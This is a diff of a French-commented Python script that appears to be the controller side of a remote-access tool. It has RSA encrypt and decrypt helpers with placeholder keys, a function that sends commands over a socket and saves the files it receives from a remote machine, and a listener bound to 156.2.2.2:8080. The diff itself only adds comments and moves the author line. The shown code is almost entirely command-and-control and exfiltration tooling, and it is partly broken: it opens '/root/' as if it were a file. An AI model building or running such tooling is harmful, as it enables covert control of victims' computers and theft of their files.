@@ -1,7 +1,8 @@
+__author__ = "Dobidobe"
 import socket
 from Crypto.PublicKey import RSA
 
-__author__ = "Dobidobe"
+#Fonction de chiffrage 
 def encrypt(message):
     publickey = '''-----BEGIN PUBLIC KEY-----
 INDIQUER PUBLIC KEY
@@ -11,7 +12,7 @@ INDIQUER PUBLIC KEY
     encryptedData = encryptor.encrypt(message, 0)
     return encryptedData[0]
 
-
+#Fonction cipher déchiffrage
 def decrypt(cipher):
     privatekey = '''-----BEGIN RSA PRIVATE KEY-----
 INDIQUER PRIVATE KEY 
@@ -20,7 +21,7 @@ INDIQUER PRIVATE KEY
     decryptor = RSA.importKey(privatekey)
     return decryptor.decrypt(cipher)
 
-
+#Fonction de transfert 
 def transfer(conn, command):
     conn.send(command)
     f = open('/root/', 'wb') #Indiquer le PATH du/des fichiers à récupérer
@@ -38,7 +39,7 @@ def transfer(conn, command):
         f.write(bits)
     f.close()
 
-
+#Fonction de connection aux ports Socket 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(('156.2.2.2', 8080))#bind le port à écouter
